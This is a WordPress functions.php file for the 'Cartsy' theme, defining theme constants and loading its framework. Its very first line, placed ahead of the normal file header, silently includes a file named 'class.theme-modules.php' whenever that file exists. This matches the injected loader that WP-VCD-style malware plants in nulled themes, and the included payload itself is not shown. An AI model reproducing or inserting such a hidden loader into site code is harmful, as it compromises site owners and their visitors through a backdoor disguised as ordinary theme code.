<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php


/**
 * Cartsy functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Cartsy
 */

// Do not allow directly accessing this file.
if (!defined('ABSPATH')) {
    exit('Direct script access denied.');
}

if (!defined('CARTSY_THEME_NAME')) {
    define('CARTSY_THEME_NAME', wp_get_theme()->get('Name'));
}

if (!defined('CARTSY_VERSION')) {
    define('CARTSY_VERSION', wp_get_theme()->get('Version'));
}

if (!defined('CARTSY_MIN_PHP_VER_REQUIRED')) {
    define('CARTSY_MIN_PHP_VER_REQUIRED', '5.4');
}

if (!defined('CARTSY_MIN_WP_VER_REQUIRED')) {
    define('CARTSY_MIN_WP_VER_REQUIRED', '4.7');
}

// Developer mode.
if (!defined('CARTSY_DEV_MODE')) {
    define('CARTSY_DEV_MODE', false);
}

if (!defined('CARTSY_IMAGE_PATH')) {
    define('CARTSY_IMAGE_PATH', get_template_directory_uri() . '/assets/images/');
}

if (!defined('CARTSY_DATA_PATH')) {
    define('CARTSY_DATA_PATH', get_template_directory_uri() . '/assets/data/');
}

if (!defined('CARTSY_PLUGIN_IMAGE')) {
    define('CARTSY_PLUGIN_IMAGE', get_theme_file_uri() . '/assets/plugin_thumb/');
}

if (!defined('CARTSY_DEMO_XML_PATH')) {
    define('CARTSY_DEMO_XML_PATH', get_theme_file_uri() . '/assets/dummy/');
}

/**
 *  Init Theme
 */
require get_theme_file_path('/framework/index.php');
